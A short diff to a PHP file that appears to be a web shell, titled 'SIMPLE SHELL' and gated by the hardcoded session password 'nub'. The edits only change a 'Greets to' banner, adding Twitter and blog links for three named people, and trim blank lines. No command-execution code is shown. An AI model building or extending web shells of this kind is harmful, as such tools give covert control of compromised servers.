@@ -36,12 +36,13 @@ if(@$_SESSION['password'] == 'nub'){
 	echo '<body style="background-color:#222;color:red;font-family:rockwell">
 		<table style="border:2px solid white;color:white">
 		<tr><td>
-			<b><td><span style="color:white;">Greets to </span>:</td><td><span><a href="http://blog.lolwaleet.com" target="_blank" style="text-decoration:none;color:lightblue">Abk Khan</a></span></td>
-					<td> <span style="color:white">|</span> <span style="color:silver">Rahul Maini</span></td>
-					<td> <span style="color:white">| </span><span style="color:lightgreen">Rony Das </span></td>
+			<b><td><span style="color:white;">Greets to </span>:</td><td><span><a href="https://twitter.com/Asystolik" target="_blank" style="text-decoration:none;color:lightblue">Abk Khan &hearts; (@Asystolik)</a></a> <a href="http://blog.lolwaleet.com/" targer="_blank" style="text-decoration:none;color:lime" >Abk\'s blog->http://blog.lolwaleet.com/</a></span></td>
+					<td> <span style="color:white">|</span> <span style="color:silver"><a href="https://twitter.com/iamnoooob" target="_blank" style="text-decoration:none;color:silver">Rahul Maini &hearts; (@iamnoooob)</span></td>
+					<td> <span style="color:white">| </span><span style="color:lightgreen"><a href="https://twitter.com/0xrony" target="_blank" style="text-decoration:none;color:lightgreen">Rony Das &hearts; (@0xrony)</a></span></td>
 			</td></b>
 			</tr>				 
 		</table>
+		<br>
 		<center>
 		<span style="font-size:35px;color:green;">SIMPLE SHELL</span><br><br>
 		<form action="" method="POST">
@@ -653,18 +654,3 @@ echo "<form action='' method='POST'>
 	</body>
 </html>
 <html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
